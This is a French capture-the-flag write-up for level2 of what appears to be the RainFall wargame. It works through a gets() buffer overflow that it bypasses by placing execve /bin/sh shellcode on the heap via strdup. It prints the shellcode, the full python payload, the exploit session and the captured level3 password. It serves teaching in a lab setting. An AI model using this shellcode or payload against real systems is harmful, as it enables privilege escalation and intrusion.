Bon cette fois c'est un peu plus complique...

En ouvrant avec GDB on voit que le programme appelle la fonction `p`  
Cette fonction utilise la fonction `gets` donc vulnérable a un buffer overflow  
Juste avant il y a un buffer de 64 bytes qui est déclaré sur la stack apres un vide de 12 bytes
Malheureusement pour nous, il y a une verification juste apres qui verifie que la fonction `p` ne renvoie pas sur la stack  
Donc on ne peut pas utiliser de shellcode sur la stack  

Cependant, on peut se servir de la heap pour stocker notre shellcode car le programme fait un `strdup` de la chaine passee a `gets`  
Ainsi, on peut recuperer un shellcode sur un site comme [shell-storm](http://shell-storm.org/shellcode/),  
le passer a `gets` pour qu'il soit copie sur la heap et ensuite ecraser l'adresse de retour de `p` pour qu'elle pointe sur notre shellcode

J'ai choisi un shellcode qui appelle `execve` avec `/bin/sh` en argument [ici](https://shell-storm.org/shellcode/files/shellcode-811.html)  
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80` (28 octets)

Derniere chose, il nous faut l'addresse sur la heap de notre shellcode pour pouvoir l'executer.  
On peut le faire avec `ltrace` pour voir l'adresse de la chaine copiee sur la heap

INFO: `ltrace` est un outil qui permet de tracer les appels a des fonctions de librairies dynamiques (comme `strdup` par exemple)

```bash
level2@RainFall:~$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                   = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5)                                        = 0xbffff70c
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
)                                                                                    = 32
strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")                                            = 0x0804a008                                                                                                                                   = 0x0804a008
+++ exited (status 8) +++
```

On voit que l'adresse de notre chaine est `0x0804a008` soit `0x08a00408` en little endian

Du coup on peut faire notre exploit:
1. On envoie notre shellcode de 28 bytes
2. On envoie (12 + 64 + 4) - 28 = 52 bytes au pif (0x42 a tout hasard) pour remplir le buffer
3. On envoie l'adresse de notre shellcode sur la heap pour ecraser l'adresse de retour de `p`

```bash
level2@RainFall:~$ python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x42"*52 + "\x08\xa0\x04\x08"' > /tmp/payload2
level2@RainFall:~$ cat /tmp/payload2 - | ./level2
1�Ph//shh/bin����°
                  ̀1�@̀BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�
pwd
/home/user/level2
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Une bonne video sur le sujet:
[Running a Buffer Overflow Attack - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo)

PS: Flags pour compiler source.c: `-m32 -march=i686 -O0 -g`
PS2: Commande pour afficher en Intel dans gdb: `set disassembly-flavor intel`

PS3: Assembleur (Intel) de la fonction `p`:
```asm
/* 080484d4 <p>:                       */
/*  80484d4:       55                  */    push   ebp                                 ; stack frame
/*  80484d5:       89 e5               */    mov    ebp,esp                             ; stack frame
/*  80484d7:       83 ec 68            */    sub    esp,0x68                            ; allocate 104 bytes on stack
/*  80484da:       a1 60 98 04 08      */    mov    eax,ds:0x8049860                    ; move stdout to eax
/*  80484df:       89 04 24            */    mov    DWORD PTR [esp],eax                 ; set stack pointer to eax = stdout
/*  80484e2:       e8 c9 fe ff ff      */    call   fflush@plt                          ; call fflush(stdout)
/*  80484e7:       8d 45 b4            */    lea    eax,[ebp-0x4c]                      ; load effective address of ebp-0x4c (ebp - 76) into eax
/*  80484ea:       89 04 24            */    mov    DWORD PTR [esp],eax                 ; set stack pointer to eax
/*  80484ed:       e8 ce fe ff ff      */    call   gets@plt                            ; call gets(ebp-0x4c)
/*  80484f2:       8b 45 04            */    mov    eax,DWORD PTR [ebp+0x4]             ; move function argument 1 (return address) to eax
/*  80484f5:       89 45 f4            */    mov    DWORD PTR [ebp-0xc],eax             ; move eax (return address) to ebp-0xc (ebp - 12)
/*  80484f8:       8b 45 f4            */    mov    eax,DWORD PTR [ebp-0xc]             ; move (ebp - 12) to eax
/*  80484fb:       25 00 00 00 b0      */    and    eax,0xb0000000                      ; bitwise eax with 0xb0000000 => check if eax is on the stack
/*  8048500:       3d 00 00 00 b0      */    cmp    eax,0xb0000000                      ; compare eax with 0xb0000000 (check if eax is on the stack)
/*  8048505:       75 20               */    jne    8048527 <p+0x53>                    ; jump if not equal
/*  8048507:       b8 20 86 04 08      */    mov    eax,0x8048620                       ; move "(%p)\n" to eax
/*  804850c:       8b 55 f4            */    mov    edx,DWORD PTR [ebp-0xc]             ; move (ebp - 12) to edx
/*  804850f:       89 54 24 04         */    mov    DWORD PTR [esp+0x4],edx             ; set arg1 to edx (ebp - 12)
/*  8048513:       89 04 24            */    mov    DWORD PTR [esp],eax                 ; set arg0 to eax ("(%p)\n")
/*  8048516:       e8 85 fe ff ff      */    call   printf@plt                          ; call printf("(%p)\n", ebp-0xc)
/*  804851b:       c7 04 24 01 00 00 00*/    mov    DWORD PTR [esp],0x1                 ; set arg0 to 1
/*  8048522:       e8 a9 fe ff ff      */    call   _exit@plt                           ; call _exit(1)
/*  8048527:       8d 45 b4            */    lea    eax,[ebp-0x4c]                      ; load effective address of ebp-0x4c (ebp - 76) into eax
/*  804852a:       89 04 24            */    mov    DWORD PTR [esp],eax                 ; set arg0 to eax
/*  804852d:       e8 be fe ff ff      */    call   puts@plt                            ; call puts(eax)
/*  8048532:       8d 45 b4            */    lea    eax,[ebp-0x4c]                      ; load effective address of ebp-0x4c (ebp - 76) into eax
/*  8048535:       89 04 24            */    mov    DWORD PTR [esp],eax                 ; set arg0 to eax
/*  8048538:       e8 a3 fe ff ff      */    call   strdup@plt                          ; call strdup(eax)
/*  804853d:       c9                  */    leave
/*  804853e:       c3                  */    ret
```